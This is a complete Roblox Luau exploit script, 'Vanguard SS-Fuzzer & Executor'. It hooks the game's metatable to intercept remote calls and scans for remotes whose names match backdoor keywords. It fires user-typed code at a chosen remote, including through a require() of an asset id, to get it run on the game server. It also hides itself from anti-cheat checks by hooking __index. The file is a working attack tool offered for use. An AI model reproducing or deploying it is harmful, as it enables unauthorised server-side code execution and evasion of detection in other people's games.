local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if method == "FireServer" and not checkcaller() then
        print("Remote Fired: " .. self.Name)
        for i, v in ipairs(args) do
            print(string.format("  Arg [%d]: %s (%s)", i, tostring(v), type(v)))
        end
    end
    return oldNamecall(self, ...)
end)
setreadonly(mt, true)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
getgenv().VanguardConfig = {
    AutoScan = true,
    LogFails = false,
    SafeMode = true
}
local BackdoorKeywords = {
    "Handshake", "RemoteEvent", "Gbackdoor", "Seraph", "DexRemote", 
    "VirtualInput", "ServerSide", "Execution", "Execute", "v3rm", "loadstring"
}
local DetectedRemotes = {}
local SelectedRemote = nil
local VanguardUI = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local RemoteList = Instance.new("ScrollingFrame")
local CodeInput = Instance.new("TextBox")
local ExecuteBtn = Instance.new("TextButton")
local ScanBtn = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
VanguardUI.Name = "VanguardSS"
VanguardUI.Parent = (gethui and gethui()) or (get_hidden_ui and get_hidden_ui()) or StarterGui
VanguardUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
MainFrame.Name = "MainFrame"
MainFrame.Parent = VanguardUI
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.Size = UDim2.new(0, 450, 0, 350)
MainFrame.Active = true
MainFrame.Draggable = true
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Font = Enum.Font.Code
Title.Text = " VANGUARD // SS-FUZZER & EXECUTOR"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
RemoteList.Name = "RemoteList"
RemoteList.Parent = MainFrame
RemoteList.Active = true
RemoteList.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
RemoteList.BorderSizePixel = 0
RemoteList.Position = UDim2.new(0.02, 0, 0.1, 0)
RemoteList.Size = UDim2.new(0.45, 0, 0.75, 0)
RemoteList.CanvasSize = UDim2.new(0, 0, 5, 0)
RemoteList.ScrollBarThickness = 2
UIListLayout.Parent = RemoteList
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 2)
CodeInput.Name = "CodeInput"
CodeInput.Parent = MainFrame
CodeInput.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CodeInput.BorderSizePixel = 0
CodeInput.Position = UDim2.new(0.5, 0, 0.1, 0)
CodeInput.Size = UDim2.new(0.48, 0, 0.75, 0)
CodeInput.ClearTextOnFocus = false
CodeInput.Font = Enum.Font.Code
CodeInput.MultiLine = true
CodeInput.PlaceholderText = "luau.."
CodeInput.Text = ""
CodeInput.TextColor3 = Color3.fromRGB(200, 200, 200)
CodeInput.TextSize = 12
CodeInput.TextWrapped = true
CodeInput.TextYAlignment = Enum.TextYAlignment.Top
ExecuteBtn.Name = "ExecuteBtn"
ExecuteBtn.Parent = MainFrame
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ExecuteBtn.Position = UDim2.new(0.5, 0, 0.88, 0)
ExecuteBtn.Size = UDim2.new(0.48, 0, 0.08, 0)
ExecuteBtn.Font = Enum.Font.Code
ExecuteBtn.Text = "EXECUTE (SERVER)"
ExecuteBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
ExecuteBtn.TextSize = 14
ScanBtn.Name = "ScanBtn"
ScanBtn.Parent = MainFrame
ScanBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ScanBtn.Position = UDim2.new(0.02, 0, 0.88, 0)
ScanBtn.Size = UDim2.new(0.45, 0, 0.08, 0)
ScanBtn.Font = Enum.Font.Code
ScanBtn.Text = "SCAN REMOTES"
ScanBtn.TextColor3 = Color3.fromRGB(255, 200, 0)
ScanBtn.TextSize = 14
local function Notify(msg)
    StarterGui:SetCore("SendNotification", {
        Title = "Vanguard SS",
        Text = msg,
        Duration = 5
    })
end
local function AddRemoteToList(remote)
    if DetectedRemotes[remote] then return end
    DetectedRemotes[remote] = true
    local RemoteBtn = Instance.new("TextButton")
    RemoteBtn.Parent = RemoteList
    RemoteBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    RemoteBtn.BorderSizePixel = 0
    RemoteBtn.Size = UDim2.new(1, 0, 0, 20)
    RemoteBtn.Font = Enum.Font.Code
    RemoteBtn.Text = remote.Name
    RemoteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    RemoteBtn.TextSize = 10
    for _, keyword in pairs(BackdoorKeywords) do
        if string.find(remote.Name, keyword) then
            RemoteBtn.TextColor3 = Color3.fromRGB(255, 50, 50)
            Notify("Potential Backdoor Found: " .. remote.Name)
            break
        end
    end
    RemoteBtn.MouseButton1Click:Connect(function()
        SelectedRemote = remote
        Notify("Target Set: " .. remote.Name)
        for _, btn in pairs(RemoteList:GetChildren()) do
            if btn:IsA("TextButton") then btn.BorderSizePixel = 0 end
        end
        RemoteBtn.BorderSizePixel = 1
        RemoteBtn.BorderColor3 = Color3.fromRGB(0, 255, 150)
    end)
end
local function ScanRemotes()
    Notify("Scanning environment for remotes...")
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            AddRemoteToList(obj)
        end
    end
end
local function ExecuteSS()
    if not SelectedRemote then
        Notify("Error: No target remote selected.")
        return
    end
    local code = CodeInput.Text
    task.spawn(function()
        if SelectedRemote:IsA("RemoteEvent") then
            SelectedRemote:FireServer(code)
            SelectedRemote:FireServer("require(5021287991):Fire('" .. code .. "')")
            SelectedRemote:FireServer({["Code"] = code})
        elseif SelectedRemote:IsA("RemoteFunction") then
            SelectedRemote:InvokeServer(code)
        end
    end)
    Notify("Payload sent to " .. SelectedRemote.Name)
end
local function HookRemotes()
    local mt = getrawmetatable(game)
    local old_namecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
            AddRemoteToList(self)
        end
        return old_namecall(self, ...)
    end)
    setreadonly(mt, true)
end
ScanBtn.MouseButton1Click:Connect(ScanRemotes)
ExecuteBtn.MouseButton1Click:Connect(ExecuteSS)
if getgenv().VanguardConfig.AutoScan then
    task.spawn(ScanRemotes)
end
HookRemotes()
Notify("Vanguard Suite Active. Awaiting Input.")
if hookmetamethod then
    local oldIndex
    oldIndex = hookmetamethod(game, "__index", function(self, key)
        if not checkcaller() and (key == "VanguardSS" or key == "VanguardConfig") then
            return nil
        end
        return oldIndex(self, key)
    end)
end
